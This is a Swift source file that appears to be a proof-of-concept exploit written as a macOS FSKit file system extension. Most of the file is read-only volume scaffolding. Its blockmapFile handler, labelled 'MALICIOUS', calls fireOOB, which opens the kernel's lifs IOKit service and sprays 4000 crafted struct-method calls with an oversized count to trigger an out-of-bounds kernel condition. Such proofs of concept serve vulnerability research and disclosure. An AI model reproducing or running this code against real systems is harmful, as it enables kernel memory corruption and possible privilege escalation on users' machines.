import Foundation
import FSKit
import IOKit
import os

let vlg = Logger(subsystem: "com.dawgyg.lifspoc", category: "vol")

final class LifsItem: FSItem {
    let name: String
    let kind: FSItem.ItemType
    let fileID: UInt64
    var size: UInt64
    init(name: String, kind: FSItem.ItemType, fileID: UInt64, size: UInt64) {
        self.name = name; self.kind = kind; self.fileID = fileID; self.size = size
        super.init()
    }
}

final class LifsVolume: FSVolume, FSVolume.Operations, FSVolume.PathConfOperations, FSVolumeKernelOffloadedIOOperations {
    let res: FSResource
    weak var fs: FSUnaryFileSystem?
    let root = LifsItem(name: "", kind: .directory, fileID: 2, size: 0)
    let file = LifsItem(name: "f", kind: .file, fileID: 3, size: 1 << 20)

    init(resource: FSResource, fs: FSUnaryFileSystem) {
        self.res = resource
        self.fs = fs
        super.init(volumeID: FSVolume.Identifier(uuid: UUID()), volumeName: FSFileName(string: "lifspoc"))
    }

    private func err(_ e: Int32) -> NSError { NSError(domain: NSPOSIXErrorDomain, code: Int(e)) }

    // PathConf
    var maximumLinkCount: Int { 1 }
    var maximumNameLength: Int { 255 }
    var restrictsOwnershipChanges: Bool { false }
    var truncatesLongNames: Bool { false }
    var maximumXattrSize: Int { 0 }
    var maximumFileSize: Int { 1 << 40 }

    // Capabilities + statistics
    var supportedVolumeCapabilities: FSVolume.SupportedCapabilities {
        let c = FSVolume.SupportedCapabilities()
        c.supportsHardLinks = false; c.supportsSymbolicLinks = false
        c.supportsPersistentObjectIDs = true
        return c
    }
    var volumeStatistics: FSStatFSResult {
        let s = FSStatFSResult(fileSystemTypeName: "lifspoc")
        s.blockSize = 4096; s.ioSize = 65536
        s.totalBlocks = 256; s.availableBlocks = 0; s.freeBlocks = 0; s.usedBlocks = 256
        s.totalBytes = 256*4096; s.availableBytes = 0; s.freeBytes = 0; s.usedBytes = 256*4096
        return s
    }

    // Lifecycle
    func activate(options: FSTaskOptions, replyHandler: @escaping (FSItem?, (any Error)?) -> Void) {
        fs?.containerStatus = FSContainerStatus.active
        replyHandler(root, nil)
    }
    func deactivate(options: FSDeactivateOptions = [], replyHandler: @escaping ((any Error)?) -> Void) { replyHandler(nil) }
    func mount(options: FSTaskOptions, replyHandler: @escaping ((any Error)?) -> Void) { replyHandler(nil) }
    func unmount(replyHandler: @escaping () -> Void) { replyHandler() }
    func synchronize(flags: FSSyncFlags, replyHandler: @escaping ((any Error)?) -> Void) { replyHandler(nil) }

    private func fillAttrs(_ a: FSItem.Attributes, _ it: LifsItem) {
        a.type = it.kind; a.linkCount = 1; a.size = it.size
        a.allocSize = (it.size + 4095) & ~4095
        if let fid = FSItem.Identifier(rawValue: it.fileID) { a.fileID = fid }
        a.uid = 0; a.gid = 0
        a.mode = it.kind == .directory ? 0o40755 : 0o100644
    }
    func getAttributes(_ desired: FSItem.GetAttributesRequest, of item: FSItem,
                       replyHandler: @escaping (FSItem.Attributes?, (any Error)?) -> Void) {
        let it = item as! LifsItem; vlg.error("VOL getAttributes \(it.name) type=\(it.kind.rawValue)"); let a = FSItem.Attributes(); fillAttrs(a, it); replyHandler(a, nil)
    }
    func setAttributes(_ newAttributes: FSItem.SetAttributesRequest, on item: FSItem,
                       replyHandler: @escaping (FSItem.Attributes?, (any Error)?) -> Void) {
        let a = FSItem.Attributes(); fillAttrs(a, item as! LifsItem); replyHandler(a, nil)
    }
    func lookupItem(named name: FSFileName, inDirectory directory: FSItem,
                    replyHandler: @escaping (FSItem?, FSFileName?, (any Error)?) -> Void) {
        vlg.error("VOL lookup named=\(name.string ?? "?")"); if name.string == "f" { replyHandler(file, FSFileName(string: "f"), nil) } else { replyHandler(nil, nil, err(ENOENT)) }
    }
    func reclaimItem(_ item: FSItem, replyHandler: @escaping ((any Error)?) -> Void) { replyHandler(nil) }
    func enumerateDirectory(_ directory: FSItem, startingAt cookie: FSDirectoryCookie,
                            verifier: FSDirectoryVerifier, attributes: FSItem.GetAttributesRequest?,
                            packer: FSDirectoryEntryPacker,
                            replyHandler: @escaping (FSDirectoryVerifier, (any Error)?) -> Void) {
        vlg.error("VOL enumerateDirectory cookie=\(cookie.rawValue)"); if cookie == FSDirectoryCookie(rawValue: 0), let fid = FSItem.Identifier(rawValue: file.fileID) {
            _ = packer.packEntry(name: FSFileName(string: "f"), itemType: .file, itemID: fid,
                                 nextCookie: FSDirectoryCookie(rawValue: 1), attributes: nil)
        }
        replyHandler(verifier, nil)
    }
    func readSymbolicLink(_ item: FSItem, replyHandler: @escaping (FSFileName?, (any Error)?) -> Void) {
        replyHandler(nil, err(EINVAL))
    }
    func createItem(named name: FSFileName, type: FSItem.ItemType, inDirectory directory: FSItem,
                    attributes newAttributes: FSItem.SetAttributesRequest,
                    replyHandler: @escaping (FSItem?, FSFileName?, (any Error)?) -> Void) { replyHandler(nil, nil, err(EROFS)) }
    func createSymbolicLink(named name: FSFileName, inDirectory directory: FSItem,
                            attributes newAttributes: FSItem.SetAttributesRequest, linkContents contents: FSFileName,
                            replyHandler: @escaping (FSItem?, FSFileName?, (any Error)?) -> Void) { replyHandler(nil, nil, err(EROFS)) }
    func createLink(to item: FSItem, named name: FSFileName, inDirectory directory: FSItem,
                    replyHandler: @escaping (FSFileName?, (any Error)?) -> Void) { replyHandler(nil, err(EROFS)) }
    func removeItem(_ item: FSItem, named name: FSFileName, fromDirectory directory: FSItem,
                    replyHandler: @escaping ((any Error)?) -> Void) { replyHandler(err(EROFS)) }
    func renameItem(_ item: FSItem, inDirectory sourceDirectory: FSItem, named sourceName: FSFileName,
                    to destinationName: FSFileName, inDirectory destinationDirectory: FSItem,
                    overItem: FSItem?, replyHandler: @escaping (FSFileName?, (any Error)?) -> Void) { replyHandler(nil, err(EROFS)) }

    // KernelOffloadedIO — packer variants + the MALICIOUS blockmap
    func createFile(name: FSFileName, in directory: FSItem, attributes: FSItem.SetAttributesRequest,
                    packer: FSExtentPacker, replyHandler: @escaping (FSItem?, FSFileName?, (any Error)?) -> Void) {
        replyHandler(nil, nil, err(EROFS))
    }
    func lookupItem(name: FSFileName, in directory: FSItem, packer: FSExtentPacker,
                    replyHandler: @escaping (FSItem?, FSFileName?, (any Error)?) -> Void) {
        if name.string == "f" { replyHandler(file, FSFileName(string: "f"), nil) }
        else { replyHandler(nil, nil, err(ENOENT)) }
    }
    func blockmapFile(_ item: FSItem, offset: off_t, length: Int, flags: FSBlockmapFlags,
                      operationID: FSOperationID, packer: FSExtentPacker,
                      replyHandler: @escaping ((any Error)?) -> Void) {
        vlg.error("VOL blockmapFile off=\(offset) len=\(length) opID=\(operationID.rawValue) -> FIRING OOB count=0x40000"); fireOOB(operationID: UInt64(operationID.rawValue))
        replyHandler(nil)
    }
    func completeIO(for item: FSItem, offset: off_t, length: Int, status: (any Error)?,
                    flags: FSCompleteIOFlags, operationID: FSOperationID,
                    replyHandler: @escaping ((any Error)?) -> Void) { replyHandler(nil) }

    func fireOOB(operationID: UInt64) {
        let svc = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("com_apple_filesystems_lifs"))
        guard svc != 0 else { return }
        var conn: io_connect_t = 0
        guard IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { return }
        var inb = [UInt8](repeating: 0, count: 0x1a8)
        inb.withUnsafeMutableBytes { p in
            p.storeBytes(of: UInt32(0x40000), toByteOffset: 0x190, as: UInt32.self)
        }
        // kernel blockmap req_id is small/sequential; spray a window to match the outstanding one
        for rid in 0..<UInt64(4000) {
            inb.withUnsafeMutableBytes { p in p.storeBytes(of: rid, toByteOffset: 0, as: UInt64.self) }
            inb.withUnsafeBytes { p in _ = IOConnectCallStructMethod(conn, 0x1f, p.baseAddress, 0x1a8, nil, nil) }
        }
        IOServiceClose(conn)
    }
}
